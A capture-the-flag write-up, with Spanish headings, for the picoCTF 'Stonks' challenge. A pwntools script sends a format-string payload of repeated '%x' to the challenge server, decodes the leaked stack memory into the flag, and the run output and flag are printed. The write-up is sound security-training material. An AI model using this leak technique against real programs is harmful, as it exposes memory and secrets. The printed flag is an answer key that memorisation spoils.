# Stonks

## Objetivo.

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

## Solución.

**Con el siguiente script obtendremos la bandera** 

```
# import pwntools
from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 33411)

# get to vulnerability
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

# send string to print stack
r.send("%x" + "-%x"*40 + "\n")

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()

# remove unwanted components
x = x[:-1].decode()

# parse to characters
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)
```

**Salida**
```
[+] Opening connection to mercury.picoctf.net on port 33411: Done
/home/frausto_san-picoctf/solve.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("View my")
/home/frausto_san-picoctf/solve.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("1\n")
/home/frausto_san-picoctf/solve.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("What is your API token?\n")
/home/frausto_san-picoctf/solve.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send("%x" + "-%x"*40 + "\n")
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}@/
[*] Closed connection to mercury.picoctf.net port 33411
```

**Bandera** picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}

## Notas opcionales.

## Referencias.